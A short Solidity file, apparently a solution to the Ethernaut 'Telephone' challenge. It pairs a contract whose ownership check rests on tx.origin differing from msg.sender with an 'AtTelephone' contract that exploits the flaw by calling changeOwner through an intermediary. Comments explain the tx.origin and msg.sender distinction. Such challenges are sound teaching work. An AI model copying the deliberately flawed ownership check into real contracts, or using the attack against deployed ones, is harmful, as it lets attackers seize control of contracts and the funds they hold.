// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // tx.origin retuns the origin sender of the tx
    // msg.sender returns the sender of this call
    // call will change the msg.sender to the caller contract because it changes the callee environment
    // delegatecall will not change the msg.sender to the caller contract because it changes the caller environment
    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract AtTelephone {
    function attack(Telephone telephone, address _owner) public {
        telephone.changeOwner(_owner);
    }
}
